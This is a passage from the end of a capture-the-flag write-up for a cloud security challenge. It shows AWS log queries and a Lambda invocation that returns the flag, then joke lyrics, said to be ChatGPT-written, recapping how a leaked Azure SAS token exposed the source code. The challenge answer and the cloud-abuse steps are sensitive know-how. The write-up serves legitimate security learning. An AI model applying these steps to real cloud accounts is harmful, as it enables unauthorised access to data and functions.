            "timestamp": 1668780225036,
            "message": "Cy-purr incident logged. Details returned in response.\n",
            "ingestionTime": 1668780227376
        },
        {
            "timestamp": 1668780225039,
            "message": "END RequestId: fdf4ec99-a296-4a3a-ad76-bfaae36f00c6\n",
            "ingestionTime": 1668780227376
        },
        {
            "timestamp": 1668780225039,
            "message": "REPORT RequestId: fdf4ec99-a296-4a3a-ad76-bfaae36f00c6\tDuration: 1037.56 ms\tBilled Duration: 1038 ms\tMemory Size: 128 MB\tMax Memory Used: 64 MB\tInit Duration: 248.95 ms\t\n",
            "ingestionTime": 1668780227376
        }
    ],
    "nextForwardToken": "f/37215042590941332020282308591224014775743903776811319299/s",
    "nextBackwardToken": "b/37215042567793158504207521770309939208734904533603647488/s"
}
```

The earliest log event was in September, which seemed the most out of place since it took place almost a full 2 months prior to the next log stream.

```json
$ aws logs get-log-events --log-group-name /aws/lambda/internal-secret-of-MeowOlympurr-webservice --log-stream-name "2022/09/29/[\$LATEST]89365d3113c74e2b8025c903e929c699"
{
    "events": [
        {
            "timestamp": 1664456598757,
            "message": "START RequestId: ef62b404-5f8e-4258-8ed5-cc4cfa0b8d9f Version: $LATEST\n",
            "ingestionTime": 1664456602885
        },
        {
            "timestamp": 1664456599881,
            "message": "secrets returned in response\n",
            "ingestionTime": 1664456602885
        },
        {
            "timestamp": 1664456599885,
            "message": "END RequestId: ef62b404-5f8e-4258-8ed5-cc4cfa0b8d9f\n",
            "ingestionTime": 1664456602885
        },
        {
            "timestamp": 1664456599885,
            "message": "REPORT RequestId: ef62b404-5f8e-4258-8ed5-cc4cfa0b8d9f\tDuration: 1127.88 ms\tBilled Duration: 1128 ms\tMemory Size: 128 MB\tMax Memory Used: 66 MB\tInit Duration: 252.13 ms\t\n",
            "ingestionTime": 1664456602885
        }
    ],
    "nextForwardToken": "f/37118622528048020294223043316229506999384126924735250435/s",
    "nextBackwardToken": "b/37118622502892779710280500412577216787836775145989341184/s"
}
```

This time, we get the message "secrets returned in response". Looks like this function does return something useful after all. Let's try to invoke the corresponding function, `internal-secret-of-MeowOlympurr-webservice`.

{% code overflow="wrap" %}
```json
$ aws lambda invoke --function-name internal-secret-of-MeowOlympurr-webservice out.txt
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}

$ cat out.txt
{"statusCode": 200, "headers": {"Content-Type": "application/json", "Access-Control-Allow-Origin": "*"}, "body": "{\"Message\": \"STF22{LIveInTh3Me0wmen7_:3}\"}", "isBase64Encoded": false}%
```
{% endcode %}

Sure enough, the flag is in the response!

## Conclusion

In conclusion, I am too lazy to write one so ChatGPT did it for me.

<figure><img src="../../.gitbook/assets/Screenshot 2022-12-05 at 7.34.41 PM.png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
Verse 1:
In Meow Olympurr, met some native Meows
They were cautious at first, but warmed up soon
They shared with me their new website for tourism
But they were not cy-purr security trained, they needed to learn

Chorus:
Log a cy-purr security case, find the secret code
Invoke the mysterious function, it's time to hit the road

Verse 2:
The young Meows were trying to get two environments to play
But something was breaking, they needed help that day
I found a CloudFront page, https://d2p9lw76n0gfo0.cloudfront.net
Scanned for hidden files, but that didn't get me anywhere yet

Chorus:
Log a cy-purr security case, find the secret code
Invoke the mysterious function, it's time to hit the road

Verse 3:
The 404 error page raised my suspicions, something was amiss
An HTTP image was loaded on an HTTPS page, that's a no-no
The CORS-Anywhere proxy caught my eye, http://18.141.147.115:8080
It added CORS headers to the resource from https://meowolympurr.z23.web.core.windows.net

Chorus:
Log a cy-purr security case, find the secret code
Invoke the mysterious function, it's time to hit the road

Verse 4:
The resource was an Azure Blob Storage URL, time to investigate
I visited the 404 error page again, this time on the blob storage site
The same error image was fetched, but with a SAS token in tow
An HTML comment hinted at using the SAS token to access the website's source code

Chorus:
Log a cy-purr security case, find the secret code
Invoke the mysterious function, it's time to hit the road

Verse 5:
The source code of this function was what I was looking for
I started by listing the containers available, using the Blob Service REST API
I specified comp=list, and appended the SAS token to the URL
This gave me a list of containers, and I found the one I was looking for

Chorus:
Log a cy-purr security case, find the secret code
Invoke the mysterious function, it's time to hit the road

Verse 6:
I accessed the container using the SAS token and the REST API
This gave me access to the source code of the function, time to get busy
I looked through the code and found the secret code, I had won
Invoking the mysterious function with the secret code, mission complete, it's done

Outro:
I found the secret code, invoked the mysterious function
Thanks to the native Meows, I conquered this sassy challenge
Logged a cy-purr security case, and learned a thing or two
In Meow Olympurr, I am a cybersecurity pro.
```
{% endcode %}
